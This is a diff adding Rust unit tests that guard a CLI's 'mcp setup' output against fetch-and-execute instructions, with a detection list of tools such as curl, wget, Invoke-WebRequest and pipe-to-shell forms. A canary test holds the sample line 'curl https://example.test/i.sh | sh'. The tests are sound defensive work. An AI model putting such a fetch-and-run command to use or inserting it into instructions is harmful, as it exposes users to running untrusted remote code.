@@ -115,4 +115,73 @@ mod tests {
     fn region_pinning_is_documented() {
         assert!(render(false).contains("AWS_REGION=eu-west-1"));
     }
+
+    /// `mcp setup` must never tell anyone to fetch and run something.
+    ///
+    /// The output's own promise is "every command below is local and
+    /// inspectable — nothing is fetched or auto-executed", and an MCP
+    /// user singled it out as the reason they could trust the setup
+    /// path. A promise like that is worth exactly as much as whatever
+    /// stops it quietly becoming false, and nothing did: the existing
+    /// tests pin the read/write variants and the JSON shape, not this.
+    ///
+    /// Pins the PROPERTY rather than the sentence, so rewording the
+    /// prose is fine and adding a `curl | sh` is not — which is the
+    /// direction it would actually drift as the surface grows.
+    #[test]
+    fn setup_never_asks_anyone_to_fetch_and_run() {
+        for allow_writes in [false, true] {
+            let s = render(allow_writes);
+
+            // A remote-fetch-and-execute, in the shapes it comes in.
+            for pattern in [
+                "curl",
+                "wget",
+                "| sh",
+                "|sh",
+                "| bash",
+                "|bash",
+                "iwr",
+                "Invoke-WebRequest",
+                "source <(",
+                "eval $(",
+                "http://",
+                "https://",
+            ] {
+                assert!(
+                    !s.contains(pattern),
+                    "`mcp setup` output contains {pattern:?}, which breaks its own \
+                     promise that nothing is fetched or auto-executed \
+                     (allow_writes={allow_writes}):\n{s}"
+                );
+            }
+
+            // And the promise itself must still be made — a guard that
+            // only forbids patterns would pass on an empty string.
+            assert!(
+                s.contains("nothing is fetched or auto-executed"),
+                "the promise must be stated, not merely kept: {s}"
+            );
+            assert!(
+                s.contains("already installed locally"),
+                "and the reason it holds — the binary is already here: {s}"
+            );
+        }
+    }
+
+    /// The canary: the scan above must be able to see an offender.
+    #[test]
+    fn the_fetch_and_run_scan_can_see_one() {
+        let bad = "install with: curl https://example.test/i.sh | sh";
+        assert!(bad.contains("curl"), "detector sees the fetcher");
+        assert!(bad.contains("https://"), "detector sees the URL");
+        assert!(bad.contains("| sh"), "detector sees the pipe-to-shell");
+        let good = "claude mcp add ebman -- ebman mcp serve";
+        for pattern in ["curl", "wget", "| sh", "https://"] {
+            assert!(
+                !good.contains(pattern),
+                "the legitimate form must not trip the detector"
+            );
+        }
+    }
 }
